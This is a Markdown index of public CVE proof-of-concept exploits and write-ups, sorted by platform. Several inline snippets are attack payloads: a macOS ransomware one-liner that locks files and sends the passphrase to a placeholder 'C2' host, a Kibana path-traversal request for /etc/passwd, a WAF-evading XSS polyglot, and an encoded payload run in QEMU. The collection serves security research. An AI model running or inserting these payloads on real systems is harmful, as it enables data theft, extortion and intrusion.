# CVEs and PoCs Resources

## General

Some CVEs PoCs repos on github or internet.

- First, see: [Awesome CVE PoC](https://github.com/qazbnm456/awesome-cve-poc) by [qazbnm456](https://github.com/qazbnm456).
- To search (without PoCs): [cve-search](https://github.com/cve-search/cve-search) you can use it off-line too.
- This is a nice Wrapper:[vFeed](https://github.com/toolswatch/vFeed).
- Automated Generation of Proofs of Vulnerability with [S2E](https://github.com/S2E/docs/blob/master/src/Tutorials/pov.rst)
- [SecurityExploits](https://github.com/Semmle/SecurityExploits): This repository contains proof-of-concept exploits developed by the Semmle Security Research Team. We always disclose security vulnerabilities responsibly, so this repository only contains exploits for vulnerabilities which have already been fixed and publicly disclosed.
- [Penetration_Testing_POC](https://github.com/Mr-xn/Penetration_Testing_POC): About penetration-testing python-script poc getshell csrf xss cms php-getshell domainmod-xss penetration-testing-poc csrf-webshell cobub-razor cve rce sql sql-poc poc-exp bypass oa-getshell cve-cms.

## Linux

- Spectre : [CVE-2017-5753,CVE-2017-5715](https://gist.github.com/Badel2/ba8826e6607295e6f26c5ed098d98d27)
- Dirty Cow: [CVE-2016-5195](https://github.com/scumjr/dirtycow-vdso) [Others](https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs)
- "Root" via dirtyc0w privilege escalation [exploit](https://gist.github.com/Arinerron/0e99d69d70a778ca13a0087fa6fdfd80)
- Huge Dirty Cow: [CVE-2017-1000405](https://github.com/bindecy/HugeDirtyCowPOC)
- SMEP,SMAP and Chrome Sandbox: [CVE-2017-5123](https://salls.github.io/Linux-Kernel-CVE-2017-5123/)
- SambaCry: [CVE-2017-7494](https://securelist.com/sambacry-is-coming/78674/)
- The Stack Clash: [CVE-2017-1000364](https://blog.qualys.com/securitylabs/2017/06/19/the-stack-clash)
- GoAhead web server: [CVE-2017-17562](https://www.elttam.com.au/blog/goahead/)
- [New bypass and protection techniques for ASLR on Linux](http://blog.ptsecurity.com/2018/02/new-bypass-and-protection-techniques.html)
- Linux ASLR integer overflow: Reducing stack entropy by four: [CVE-2015-1593](http://hmarco.org/bugs/linux-ASLR-integer-overflow.html)
- Ubuntu CVES: [CVE-2017-16995](https://github.com/Spacial/csirt/blob/master/PoCs/ubuntu_%20CVE-2017-16995.c), [netfilter](https://github.com/Spacial/csirt/blob/master/PoCs/ubuntu_netfilter.c), [CVE-2013-1763](https://github.com/Spacial/csirt/blob/master/PoCs/ubuntu_%20CVE-2013-1763.c)
- Linux Kernel Version 4.14 - 4.4 (Ubuntu && Debian): [CVE-2017-16995](https://github.com/iBearcat/CVE-2017-16995)
- Meltdown/Spectre: [Understanding Spectre and Meltdown Vulnerability](https://miuv.blog/2018/03/20/understanding-spectre-and-meltdown-vulnerability-part-2/)
- Linux Kernel TCP implementation vulnerable to Denial of Service: [CVE-2018-5390](https://www.kb.cert.org/vuls/id/962459)
- Linux Kernel Vulnerability Can Lead to Privilege Escalation: Analyzing [CVE-2017-1000112](https://securingtomorrow.mcafee.com/mcafee-labs/linux-kernel-vulnerability-can-lead-to-privilege-escalation-analyzing-cve-2017-1000112/). repo: [kernel-exploits](https://github.com/xairy/kernel-exploits): A bunch of proof-of-concept exploits for the Linux kernel.
- Malicious Command Execution via bash-completion: [CVE-2018-7738](https://blog.grimm-co.com/post/malicious-command-execution-via-bash-completion-cve-2018-7738/)
- An integer overflow flaw was found in the Linux kernel's create_elf_tables() function: [CVE-2018-14634](https://access.redhat.com/security/cve/cve-2018-14634)
- [This repo records all the vulnerabilities of linux software I have reproduced in my local workspace](https://github.com/VulnReproduction/LinuxFlaw)
- [linux-kernel-exploitation](https://github.com/xairy/linux-kernel-exploitation): A bunch of links related to Linux kernel exploitation
- [Linux Privilege Escalation – Using apt-get/apt/dpkg to abuse sudo “NOPASSWD” misconfiguration](https://lsdsecurity.com/2019/01/linux-privilege-escalation-using-apt-get-apt-dpkg-to-abuse-sudo-nopasswd-misconfiguration/)
- [System Down](https://www.qualys.com/2019/01/09/system-down/system-down.txt): A systemd-journald exploit. Combined Exploitation of CVE-2018-16865 and CVE-2018-16866
- [mario_baslr](https://github.com/felixwilhelm/mario_baslr): PoC for breaking hypervisor ASLR using branch target buffer collisions.
- waitid: [CVE-2017-5123](https://github.com/nongiach/CVE/tree/master/CVE-2017-5123)
- sudo: [CVE-2019-14287](https://sensorstechforum.com/cve-2019-14287-sudo-bug/) - Sudo Bug Allows Restricted Users to Run Commands as Root. [redhat](https://access.redhat.com/security/cve/cve-2019-14287), [PoC](https://www.sudo.ws/alerts/minus_1_uid.html)
- Memory corruption in net/packet/af_packet.c: [CVE-2020-14386](https://www.openwall.com/lists/oss-security/2020/09/03/3), [poc](https://www.openwall.com/lists/oss-security/2020/09/03/3/2)
- [BlindSide](https://www.vusec.net/projects/blindside/)
- Exploiting a Linux kernel vulnerability in the V4L2 subsystem: [CVE-2019-18683](https://a13xp0p0v.github.io/2020/02/15/CVE-2019-18683.html)
- Heap-Based Buffer Overflow in Sudo: [CVE-2021-3156](https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit)

## Solaris

- Kernel Level Privilege Escalation in Oracle Solaris: [CVE-2018-2892](https://www.trustwave.com/Resources/SpiderLabs-Blog/CVE-2018-2892---Kernel-Level-Privilege-Escalation-in-Oracle-Solaris/)

## Windows

- Office: [CVE-2017-0199](https://github.com/bhdresh/CVE-2017-0199)
- WebDAV: [CVE-2017-11882](https://github.com/embedi/CVE-2017-11882)
- WSDL Parser: [CVE-2017-8759](https://github.com/Voulnet/CVE-2017-8759-Exploit-sample)
  - MS .NET: [CVE-2017-8759](https://github.com/bhdresh/CVE-2017-8759)
  - WPAD/PAC: [aPAColypse now](https://googleprojectzero.blogspot.com.br/2017/12/apacolypse-now-exploiting-windows-10-in_18.html)
  - Meltdown/Spectre:[CVE-2017-5754,CVE-2017-5715](https://github.com/ionescu007/SpecuCheck)
  - Packager OLE: [CVE-2018-0802](https://github.com/rxwx/CVE-2018-0802)
  - Integer Overflow: [Integer Overflow](https://github.com/k0keoyo/Dark_Composition_case_study_Integer_Overflow)
  - Hardcore corruption of my execve() vulnerability in WSL: [CVE-2018-0743](https://github.com/saaramar/execve_exploit)
  - Privilege Escalation Vulnerability in Windows Standard Collector Service: [CVE-2018-0952](https://www.atredis.com/blog/cve-2018-0952-privilege-escalation-vulnerability-in-windows-standard-collector-service)
  - [Exploit Published for Windows Task Scheduler Zero-Day](https://www.securityweek.com/exploit-published-windows-task-scheduler-zero-day). [poc](https://github.com/SandboxEscaper/randomrepo)
  - [PowerPool](https://www.welivesecurity.com/2018/09/05/powerpool-malware-exploits-zero-day-vulnerability/) malware exploits ALPC LPE zero-day vulnerability
  - You can't contain me! :: Analyzing and Exploiting an Elevation of Privilege Vulnerability in Docker for Windows: [CVE-2018-15514](https://srcincite.io/blog/2018/08/31/you-cant-contain-me-analyzing-and-exploiting-an-elevation-of-privilege-in-docker-for-windows.html)
- [Invoke-WMILM](https://github.com/Cybereason/Invoke-WMILM): This is a PoC script for various methods to acheive authenticated remote code execution via WMI, without (at least directly) using the Win32_Process class. The type of technique is determined by the "Type" parameter.
- Use-after-free (UAF) vulnerability: [CVE-2018-8373](https://blog.trendmicro.com/trendlabs-security-intelligence/new-cve-2018-8373-exploit-spotted/)
- Microsoft Edge RCE: [CVE-2018-8495](https://leucosite.com/Microsoft-Edge-RCE/)
- Device Guard/CLM bypass using MSFT_ScriptResource: [CVE-2018–8212](https://posts.specterops.io/cve-2018-8212-device-guard-clm-bypass-using-msft-scriptresource-b6cc2318e885)
- [A PoC function to corrupt the g_amsiContext global variable in clr.dll in .NET Framework Early Access build 3694](https://gist.github.com/mattifestation/ef0132ba4ae3cc136914da32a88106b9)
- [windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits): windows-kernel-exploits Windows平台提权漏洞集合
- [docx-embeddedhtml-injection](https://github.com/thom-s/docx-embeddedhtml-injection): This PowerShell script exploits a known vulnerability in Word 2016 documents with embedded online videos by injecting HTML code into a docx file, replacing the values of all pre-existing embeddedHtml tags.
- Root Cause of the Kernel Privilege Escalation Vulnerabilities: [CVE-2019-0808](http://blogs.360.cn/post/RootCause_CVE-2019-0808_EN.html)
- DACL Permissions Overwrite Privilege Escalation: [CVE-2019-0841](https://krbtgt.pw/dacl-permissions-overwrite-privilege-escalation-cve-2019-0841/)
- Scanner PoC for RDP RCE vuln: [CVE-2019-0708](https://github.com/zerosum0x0/CVE-2019-0708)
- Exploiting the Windows Task Scheduler Through: [CVE-2019-1069](https://www.zerodayinitiative.com/blog/2019/6/11/exploiting-the-windows-task-scheduler-through-cve-2019-1069)
- [cve-2019-0708-scan](https://github.com/major203/cve-2019-0708-scan)
- More Than a Penetration Test: [CVE-2019–1082](https://medium.com/@bazyli.michal/more-than-a-penetration-test-cve-2019-1082-647ba2e59034).
- Out-Of-Bounds Read\Write: [CVE-2019-1164](https://cpr-zero.checkpoint.com/vulns/cprid-2133/)
- Bluekeep: [CVE-2019-0708](https://www.kryptoslogic.com/blog/2019/11/bluekeep-cve-2019-0708-exploitation-spotted-in-the-wild/)
- Full exploit chain against Firefox on Windows 64-bit: [CVE-2019-11708 & CVE-2019-9810](https://github.com/0vercl0k/CVE-2019-11708)
- [CVE-2020-0601](https://research.kudelskisecurity.com/2020/01/15/cve-2020-0601-the-chainoffools-attack-explained-with-poc/): the ChainOfFools/CurveBall attack explained with PoC
- Chainoffools: A PoC for [CVE-2020-0601](https://github.com/kudelskisecurity/chainoffools)
- CurveBall: PoC for [CVE-2020-0601](https://github.com/ollypwn/CVE-2020-0601)
- [Microsoft Windows - CryptoAPI (Crypt32.dll) Elliptic Curve Cryptography (ECC) Spoof Code-Signing Certificate](https://www.exploit-db.com/exploits/47933)
- Glueball, CVE-2020-1464: [Interesting tactic by Ratty & Adwind for distribution of JAR appended to signed MSI – CVE-2020-1464](https://www.securityinbits.com/malware-analysis/interesting-tactic-by-ratty-adwind-distribution-of-jar-appended-to-signed-msi/), [GlueBall: The story of CVE-2020–1464](https://medium.com/@TalBeerySec/glueball-the-story-of-cve-2020-1464-50091a1f98bd)
- Analysis of Recently Fixed IE Zero-Day: [CVE-2020-1380](https://www.trendmicro.com/en_us/research/20/h/cve-2020-1380-analysis-of-recently-fixed-ie-zero-day.html)
- [MIcrosoft-Word-Use-After-Free](https://github.com/whiteHat001/MIcrosoft-Word-Use-After-Free) - Word Docx with exploit.
- [Half Life 1](https://hackerone.com/reports/832750) - Buffer overflow In hl.exe's launch -game argument allows an attacker to execute arbitrary code locally or from browser
- [PoC for enabling wdigest to bypass credential guard ](https://gist.github.com/N4kedTurtle/8238f64d18932c7184faa2d0af2f1240)
- Zerologon exploit Test tool for: [CVE-2020-1472](https://github.com/SecuraBV/CVE-2020-1472/) [paper](https://www.secura.com/blog/zero-logon) [PoC exploit](https://github.com/dirkjanm/CVE-2020-1472/). Another tools: [ze0Dump](https://github.com/bb00/zer0dump), [SharpZeroLogon](https://github.com/nccgroup/nccfsas/) - [From Lares Labs: Defensive Guidance for ZeroLogon](https://www.lares.com/blog/from-lares-labs-defensive-guidance-for-zerologon-cve-2020-1472/), [another exploit](https://github.com/BC-SECURITY/Invoke-ZeroLogon), [A different way of abusing Zerologon (CVE-2020-1472)](https://dirkjanm.io/a-different-way-of-abusing-zerologon/) [ZeroLogon detected by Microsoft Defender for Identity](https://techcommunity.microsoft.com/t5/microsoft-365-defender/zerologon-is-now-detected-by-microsoft-defender-for-identity-cve/ba-p/1734034)
- [CobaltStrike-BOF](https://github.com/Yaxser/CobaltStrike-BOF): Collection of beacon BOF written to learn windows and cobaltstrike
- Kerberos Bronze Bit Attack – Practical Exploitation: [CVE-2020-17049](https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-attack/)
- Windows SMB Information Disclousure Analysis [CVE-2020-17140](https://blogs.360.cn/post/CVE-2020-17140-Analysis.html)
- BitLocker Lockscreen bypass: [CVE-2020-1398](https://secret.club/2021/01/15/bitlocker-bypass.html)

## macOS/iOS

- RootPiper:  [Demo/PoC](https://github.com/Shmoopi/RootPipe-Demo)  [Tester](https://github.com/sideeffect42/RootPipeTester)
  - [Mac Privacy: Sandboxed Mac apps can record your screen at any time without you knowing](https://github.com/KrauseFx/krausefx.com/blob/master/_posts/2018-02-10-mac-privacy-sandboxed-mac-apps-can-take-screenshots.md) by [Felix Krause](https://github.com/KrauseFx)
- [ROPLevel6 Writeup](https://github.com/shmoo419/ExploitChallengeWriteups/blob/master/ROPLevel6/Writeup.md)
- Escaping the sandbox by misleading bluetoothd:[CVE-2018-4087](https://blog.zimperium.com/cve-2018-4087-poc-escaping-sandbox-misleading-bluetoothd)
- [Reexport symbols for Mach-O and ELF.](https://github.com/xerub/reexport)
- [Jailbreak for iOS 10.x 64bit devices without KTRR](https://github.com/tihmstar/doubleH3lix)
- MS Office 2016 for Mac Privilege Escalation via a Legacy Package: [CVE-2018–8412](https://medium.com/0xcc/cve-2018-8412-ms-office-2016-for-mac-privilege-escalation-via-a-legacy-package-7fccdbf71d9b)
- blanket: Mach port replacement vulnerability in launchd on iOS 11.2.6 leading to sandbox escape, privilege escalation, and codesigning bypass ([CVE-2018-4280](https://github.com/bazad/blanket))
- brokentooth: POC for [CVE-2018-4327](https://github.com/omerporze/brokentooth)
- Kernel RCE caused by buffer overflow in Apple's ICMP packet-handling code: [CVE-2018-4407](https://lgtm.com/blog/apple_xnu_icmp_error_CVE-2018-4407)
- [Offensive testing to make Dropbox (and the world) a safer place](https://blogs.dropbox.com/tech/2018/11/offensive-testing-to-make-dropbox-and-the-world-a-safer-place/)
- [WebKit-RegEx-Exploit](https://github.com/LinusHenze/WebKit-RegEx-Exploit): Safari 12.1.1
- [Chaos iOS](https://github.com/GeoSn0w/Chaos): < 12.1.2 PoC by @S0rryMyBad since he posted it as a photo rather than a source code. Also cleaned up.
- [powerd](https://github.com/0x36/powend) exploit : Sandbox escape to root for Apple iOS < 12.2 on A11 devices
- iMessage: The Many Possibilities of [CVE-2019-8646](https://googleprojectzero.blogspot.com/2019/08/the-many-possibilities-of-cve-2019-8646.html) [poc](PoCs/CVE-2019-8646-messageleak.zip)
- [PoC tool for setting nonce without triggering KPP/KTRR/PAC.](https://github.com/0x7ff/dimentio) (requires tfp0)
- [CVE-2020-9934](https://github.com/mattshockl/CVE-2020-9934)
- [Stealing local files using Safari Web Share API](https://blog.redteam.pl/2020/08/stealing-local-files-using-safari-web.html) [PoC](https://overflow.pl/webshare/poc1.html)
- xnu local privilege escalation via [os x 10.10.5 kernel local privilege escalation](https://github.com/kpwn/tpwn)
- [MacOS Ransomware in one tweet](https://twitter.com/lordx64/status/1314614366361264130): 
  ```sh
  sh -c 'p=$(head -n 1024 /dev/urandom | strings| grep -o "[[:alnum:]]" | head -n 64| tr -d "\n"); diskutil apfs addVolume disk1 APFS x -passphrase "$p"; rsync -zvh --remove-source-files ~/exfil/* /Volumes/x; diskutil umount x; curl -0 http://C2/"$p"'
  ```

## Android

- [Please Stop Naming Vulnerabilities](https://pleasestopnamingvulnerabilities.com): Exploring 6 Previously Unknown Remote Kernel Bugs Affecting Android Phones
- [qu1ckr00t](https://hernan.de/blog/2019/10/15/tailoring-cve-2019-2215-to-achieve-root/): Tailoring [CVE-2019-2215](https://github.com/grant-h/qu1ckr00t) to Achieve Root.
- [s8_2019_2215_poc](https://github.com/chompie1337/s8_2019_2215_poc): PoC 2019-2215 exploit for S8/S8 active with DAC + SELinux + Knox/RKP bypass.
- Universal XSS in Android WebView: [CVE-2020-6506](https://alesandroortiz.com/articles/uxss-android-webview-cve-2020-6506/)

## Java

- Spring Data Commons: [CVE-2018-1273](https://gist.github.com/matthiaskaiser/bfb274222c009b3570ab26436dc8799e)

## Apache Struts

- How to find 5 RCEs in Apache Struts with Semmle QL: [CVE-2018-11776](https://lgtm.com/blog/apache_struts_CVE-2018-11776)
- Semmle Discovers Critical Remote Code Execution Vulnerability in Apache Struts: [CVE-2018-11776](https://semmle.com/news/apache-struts-CVE-2018-11776), [docker Poc](https://github.com/jas502n/St2-057), [other poc](https://github.com/mazen160/struts-pwn_CVE-2018-11776)
- [Apache Struts Vulnerability POC Code Found on GitHub](https://news.hitb.org/content/apache-struts-vulnerability-poc-code-found-github)
- [struts-pwn](https://github.com/mazen160/struts-pwn_CVE-2018-11776): An exploit for Apache Struts CVE-2018-11776

## BMC

- HPE iLO4: [CVE-2017-12542](https://github.com/airbus-seclab/ilo4_toolbox/blob/master/README.rst)

## Hardware

### x86

- Spectre: [CVE-2017-5753,CVE-2017-5715](https://spectreattack.com/)
- Meltdown: [CVE-2017-5754](https://meltdownattack.com/)
- Cyberus: [Meltdown](http://blog.cyberus-technology.de/posts/2018-01-03-meltdown.html)
- L1 Terminal Fault: [CVE-2018-3615/CVE-2018-3620/CVE-2018-3646/INTEL-SA-00161](https://software.intel.com/security-software-guidance/software-guidance/l1-terminal-fault)
- [TPM—Fail](http://tpm.fail/): TPM meets Timing and Lattice Attacks. [TPM-FAIL vulnerabilities impact TPM chips in desktops, laptops, servers](https://www.zdnet.com/article/tpm-fail-vulnerabilities-impact-tpm-chips-in-desktops-laptops-servers/), [github](https://github.com/VernamLab/TPM-Fail).

### ARM

- [ARM exploitation for IoT – Episode 3](https://quequero.org/2017/11/arm-exploitation-iot-episode-3/)
- [Multiple vulnerabilities found in Wireless IP Camera](https://pierrekim.github.io/blog/2017-03-08-camera-goahead-0day.html#backdoor-account): CVE-2017-8224, CVE-2017-8222, CVE-2017-8225, CVE-2017-8223, CVE-2017-8221
- [DoubleDoor](https://blog.newskysecurity.com/doubledoor-iot-botnet-bypasses-firewall-as-well-as-modem-security-using-two-backdoor-exploits-88457627306d), IoT Botnet bypasses firewall as well as modem security using two backdoor exploits: CVE-2015–7755 and CVE-2016–10401
- [i.MX7 M4 Atomic Cache Bug](https://rschaefertech.wordpress.com/2018/02/17/imx7-hardware-bug/)
- [MikroTik Firewall & NAT Bypass](https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24)

## VirtualBox

- From Compiler Optimization to Code Execution - VirtualBox VM Escape: [CVE-2018-2844](https://www.voidsecurity.in/2018/08/from-compiler-optimization-to-code.html). [poc](https://github.com/renorobert/virtualbox-cve-2018-2844/)
- [VirtualBox 3D PoCs & exploits](https://github.com/niklasb/3dpwn)
- [Multiple Vulnerabilities on Kerui Endoscope Camera](https://utkusen.com/blog/multiple-vulnerabilities-on-kerui-endoscope-camera.html)
- [virtualbox_e1000_0day](https://github.com/MorteNoir1/virtualbox_e1000_0day):  VirtualBox E1000 Guest-to-Host Escape

## PHP

- PHPMailer: [CVE-2016-10033](https://github.com/opsxcq/exploit-CVE-2016-10033)
- PHP PrestaShop 1.6.x Privilege Escalation: [CVE-2018-13784](https://www.ambionics.io/blog/prestashop-privilege-escalation)
- [phpLdapAdmin multiple vulns](https://github.com/opsxcq/exploit-phpldapadmin-remote-dump): phpldapadmin remote exploit and vulnerable container.
- imagecolormatch() OOB Heap Write exploit: [CVE-2019-6977](https://github.com/cfreal/exploits/tree/master/CVE-2019-6977-imagecolormatch)
- vBulletin: [2019_vbulletin_0day_info.txt](https://gist.github.com/jamesbercegay/a8f169059c6184e76b12d98d887542b3)
- [PHP 7.0-7.4 disable_functions bypass](https://github.com/mm0r1/exploits/tree/master/php7-backtrace-bypass)

## API

- [Bypassing GitHub's OAuth flow](https://blog.teddykatz.com/2019/11/05/github-oauth-bypass.html), [poc](https://not-an-aardvark.github.io/oauth-bypass-poc-fbdf56605489c74b2951/)

## Others

- Tenable a lot of [Proof of Concepts](https://github.com/tenable/poc)
- [Disclosures](https://github.com/DrunkenShells/Disclosures) by DrunkenShells
- Apache Tomcat: [CVE-2017-12617](https://github.com/cyberheartmi9/CVE-2017-12617)
- Palo Alto Networks firewalls: Palo Alto Networks firewalls remote root code execution [CVE-2017-15944](http://seclists.org/fulldisclosure/2017/Dec/38)
- [https://fail0verflow.com/blog/2017/ps4-namedobj-exploit/](https://fail0verflow.com/blog/2017/ps4-namedobj-exploit/) and  [A fully implemented kernel exploit for the PS4 on 4.05FW](https://github.com/Cryptogenic/PS4-4.05-Kernel-Exploit)
- [HOW TO HACK A TURNED-OFF COMPUTER, OR RUNNING UNSIGNED CODE IN INTEL ME](https://www.blackhat.com/docs/eu-17/materials/eu-17-Goryachy-How-To-Hack-A-Turned-Off-Computer-Or-Running-Unsigned-Code-In-Intel-Management-Engine-wp.pdf) (CVE-2017-5705, CVE-2017-5706, CVE-2017-5707), [github](https://github.com/ptresearch/unME11)
- Nintendo Switch JailBreak PoC:[CVE-2016-4657](https://github.com/iDaN5x/Switcheroo/wiki/Article)
- [Play with FILE Structure - Yet Another Binary Exploit Technique](https://www.slideshare.net/AngelBoy1/play-with-file-structure-yet-another-binary-exploit-technique)
- [Geovision Inc. IP Camera](https://github.com/mcw0/PoC/blob/master/Geovision%20IP%20Camera%20Multiple%20Remote%20Command%20Execution%20-%20Multiple%20Stack%20Overflow%20-%20Double%20free%20-%20Unauthorized%20Access.txt), with a lot others in this [repo](https://github.com/mcw0/PoC)
- [Zero-day vulnerability in Telegram](https://securelist.com/zero-day-vulnerability-in-telegram/83800/)
- [A Telegram bug that disclose phone numbers of any users in public groups](https://docs.google.com/document/d/e/2PACX-1vRx2wO2kj0axlQtv2CDSjPGlRKJOHtucvpOKGFKybh2eVVGZqvt_JJv-2Q11NHn5Y4um_F4-bgA6q5v/pub)
- [Bug or Backdoor](https://0x09al.github.io/security/ispconfig/exploit/vulnerability/2018/08/20/bug-or-backdoor-ispconfig-rce.html): Exploiting a Remote Code Execution in ISPConfig by 0x09AL Security blog.
- SSH Exploit written in Python for CVE-2018-15473 with threading and export formats: [CVE-2018-15473](https://github.com/Rhynorater/CVE-2018-15473-Exploit), [analysis](https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/)
- [RICOH MP 2001 Printer Cross Site Scripting ≈ Packet Storm](https://packetstormsecurity.com/files/149443/RICOH-MP-2001-Printer-Cross-Site-Scripting.html), [code](https://dl.packetstormsecurity.net/1809-exploits/richomp2001-xss.txt), [Cross-Site Scripting](https://www.exploit-db.com/exploits/45460/)
- Oracle WebLogic WLS-WSAT Remote Code Execution Exploit: [CVE-2017-10271](https://github.com/kkirsche/CVE-2017-10271)
- Oracle BI, [Out of Band XXE Injection Via gopher](https://medium.com/@osama.alaa/xxe-injection-in-oracle-application-server-11g-cc05f6ab55ab): [CVE-2016-3473](https://www.exploit-db.com/exploits/40590)
- WebLogic Exploit: [CVE-2017-10271](https://github.com/c0mmand3rOpSec/CVE-2017-10271)
- [Weblogic RCE by only one GET request — CVE-2020–14882 Analysis](https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf)
- Talos Vulnerability Deep Dive: Sophos HitmanPro.Alert vulnerability -  [CVE-2018-3971](https://blog.talosintelligence.com/2018/11/TALOS-2018-0636.html)
- [JPEG [JAY-peg]](https://github.com/corkami/docs/blob/master/images/jpeg.md), some pocs [JPEG PoCs](https://github.com/corkami/pocs/blob/master/images/jpg/README.md)
- Kubernets: [CVE-2018-1002105](https://github.com/evict/poc_CVE-2018-1002105)
- QEMU: vga: OOB read access during display update: [CVE-2017-13672](https://twitter.com/David3141593/status/903284919803277312),
- QEMU VM Escape: [CVE-2019-14378](https://blog.bi0s.in/2019/08/24/Pwn/VM-Escape/2019-07-29-qemu-vm-escape-cve-2019-14378/)
- Exploiting LaTeX with [CVE-2018-17407](http://nickroessler.com/latex-cve-2018-17407/)
- GitHub Desktop RCE (OSX)[H1-702 2018](https://pwning.re/2018/12/04/github-desktop-rce/), [poc](https://github.com/0xACB/github-desktop-poc/)
- [unprivileged users with UID > INT_MAX can successfully execute any systemctl command (#74)](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- Authenticated RCE in [Polycom Trio 8800](http://unkl4b.github.io/Authenticated-RCE-in-Polycom-Trio-8800-pt-1/), pt.1
- Tenable Research Advisory: Zoom Unauthorized Command Execution - [CVE-2018-15715](https://www.tenable.com/blog/tenable-research-advisory-zoom-unauthorized-command-execution-cve-2018-15715)
- [Crash Chrome 70 with the SQLite Magellan bug](https://worthdoingbadly.com/sqlitebug/) [code](https://github.com/zhuowei/worthdoingbadly.com/blob/master/_posts/2018-12-14-sqlitebug.html)
- From vulnerability report to a crafted packet using instrumentation: [CVE-2018-4013](https://invictus1306.github.io/vulnerabilitis/2018/12/29/functrace.html)
- PoC for Foxit Reader: [CVE-2018-14442](https://github.com/payatu/CVE-2018-14442)
- Social Network Tabs Wordpress Plugin Vulnerability: [CVE-2018-20555](https://github.com/fs0c131y/CVE-2018-20555)
- [700,000 WordPress Users Affected by Zero-Day Vulnerability in File Manager Plugin](https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/)
- ES File Explorer Open Port Vulnerability: [CVE-2019-6447](https://github.com/fs0c131y/ESFileExplorerOpenPortVuln)
- Atlassian Jira vulnerable: [CVE-2017-9506](https://github.com/random-robbie/Jira-Scan)
- Chrome:
  - [CVE-2019-5782](https://github.com/vngkv123/aSiagaming)
  - [CVE-2019-5786](https://github.com/exodusintel/CVE-2019-5786): FileReader Exploit
  - [CVE-2019-13054](https://github.com/mame82/munifying-web): The page utilizes the new WebHID API to extract AES encryption keys from vulnerable dongles. [PoC Page](https://mame82.github.io/munifying-web/)
- [Google Books X-Hacking](https://medium.com/@terjanq/google-books-x-hacking-29c249862f19)
- Ruby on Rails: File Content Disclosure on Rails - [CVE-2019-5418](https://github.com/mpgn/CVE-2019-5418)
- Libreoffice - Remote Code Execution via Macro/Event execution: [CVE-2018-16858](https://insert-script.blogspot.com/2019/02/libreoffice-cve-2018-16858-remote-code.html)
- Signal IDN homograph attack: [CVE-2019-9970](https://wildfire.blazeinfosec.com/security-advisory-signal-idn-homograph-attack-2/).
- [Grandstream Exploits](https://github.com/scarvell/grandstream_exploits): Grandstream Exploits
- Apache HTTPD Root Privilege Escalation - CARPE (DIEM): [CVE-2019-0211](https://cfreal.github.io/carpe-diem-cve-2019-0211-apache-local-root.html), [github](https://github.com/cfreal/exploits/tree/master/CVE-2019-0211-apache)
- Say Cheese: [Ransomware-ing a DSLR Camera](https://research.checkpoint.com/say-cheese-ransomware-ing-a-dslr-camera/) -

'''bash
$ echo H4sICH0mqFkAA3BvYwDbweS/W8LxrMCuK8wbZN85bWh494VhFIwUELoKAIJvFIwAAgAA | base64 -d | gunzip > a && qemu-system-i386 -vga cirrus a
'''

- Elasticsearch Kibana Console [CVE-2018-17246](https://twitter.com/IM_23pds/status/1074627634150006784) PoC：

```bash
GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
```

- Web/Javscript/WAF Payload will run in a lot of contexts: Short but lethal. No script tags, thus bypassing a lot of WAF and executes in multiple environments.

```javascript
javascript:"/*'/*`/*--><html \" onmouseover=/*&lt;svg/*/onload=alert()//>
```

- [Thrangrycat](https://xn--538haa.fm/)
- [Responding to Firefox 0-days in the wild](https://blog.coinbase.com/responding-to-firefox-0-days-in-the-wild-d9c85a57f15b)
- Bitbucket 6.1.1 Path Traversal to RCE: [CVE-2019-3397](https://blog.ripstech.com/2019/bitbucket-path-traversal-to-rce/)
- ThinVNC Client Authentication Bypass: [CVE-2019-17662](https://redteamzone.com/ThinVNC/) - with [PoC](https://github.com/shashankmangal2/Exploits/tree/master/CVE-2019-17662)
- metasploit http DoS module: [CVE-2019-5645](https://github.com/rapid7/metasploit-framework/pull/12433)
- PandoraFMS v7.0NG authenticated Remote Code Execution: [CVE-2019-20224](https://shells.systems/pandorafms-v7-0ng-authenticated-remote-code-execution-cve-2019-20224/)
- First Active Attack Exploiting [CVE-2019-2215](https://blog.trendmicro.com/trendlabs-security-intelligence/first-active-attack-exploiting-cve-2019-2215-found-on-google-play-linked-to-sidewinder-apt-group/) Found on Google Play, Linked to SideWinder APT Group
- Mikrotik Winbox: [CVE-2018-14847](https://github.com/BigNerd95/WinboxExploit) [metasploit 45578](https://www.exploit-db.com/exploits/45578)
- [MkCheck](https://github.com/s1l3nt78/MkCheck): Script to check MikroTik Routers the WinBox Authentication Bypass Disclosure & RouterOS Jailbreak vulnerabilities
- [Jenkins Security Advisory 2020-08-17](https://www.jenkins.io/security/advisory/2020-08-17/)/[CVE-2019-17638: Operation on a Resource after Expiration or Release in Jetty Server](https://github.com/advisories/GHSA-x3rh-m7vp-35f2) [on hacker news](https://thehackernews.com/2020/08/jenkins-server-vulnerability.html)
- Some [PoCs](https://github.com/CCob/PoC) about: CVE-2020-8207 and CVE-2020-8324.
- [Richsploit](https://github.com/redtimmy/Richsploit): [One tool to exploit all versions of RichFaces ever released](https://www.redtimmy.com/java-hacking/richsploit-one-tool-to-exploit-all-versions-of-richfaces-ever-released/) [CVE-2018-14667](https://github.com/syriusbughunt/CVE-2018-14667)
- Forget Your Perimeter - RCE in Pulse Connect Secure: [CVE-2020-8218](https://www.gosecure.net/blog/2020/08/26/forget-your-perimeter-rce-in-pulse-connect-secure/).
- some Starlabs [CVES](https://twitter.com/starlabs_sg/status/1299886166406127617): 
  - [CVE-2020-2674](https://starlabs.sg/advisories/20-2674/)
  - [CVE-2020-2682](https://starlabs.sg/advisories/20-2682/)
  - [CVE-2020-2575](https://starlabs.sg/advisories/20-2575/)
  - [CVE-2020-2748](https://starlabs.sg/advisories/20-2748/)
  - [CVE-2020-2758](https://starlabs.sg/advisories/20-2758/)
  - [CVE-2020-2894](https://starlabs.sg/advisories/20-2894/)
  - [CVE-2020-3800](https://starlabs.sg/advisories/20-3800/)
  - [CVE-2020-3801](https://starlabs.sg/advisories/20-3801/)
